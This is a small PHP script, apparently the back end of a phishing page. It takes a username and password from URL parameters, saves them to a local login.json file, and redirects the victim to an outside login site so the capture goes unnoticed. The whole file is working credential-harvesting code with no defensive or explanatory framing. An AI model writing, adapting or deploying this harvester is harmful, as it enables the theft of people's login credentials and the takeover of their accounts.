<?php

    if(isset($_GET['us'])&&isset($_GET['cont'])){
        $user=$_GET['us'];
        $passw=$_GET['cont'];
        $file ='login.json';
        $exists = is_file( $file );
        if ($exists == true) {
            $datos_c= file_get_contents("login.json");
            $json_datos = json_decode($datos_c, true);
            $datos=array($user,$passw);
            array_push($json_datos, $datos);
            $json_string = json_encode($json_datos);
            $file = 'login.json';
            file_put_contents($file, $json_string);
        } elseif ($exists == false) {
          $dato1=array(array("us", "cont"));
            $json_string = json_encode($dato1);
            $file = 'login.json';
            file_put_contents($file, $json_string);
        }
      header("Status: 301 Moved Permanently");
      header("Location: https://login.chuchojarillo.repl.co");
      exit;
    }

    

?>

<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="refresh" content="0; url=index.html">
    </head>

    <body>

    </body>
</html>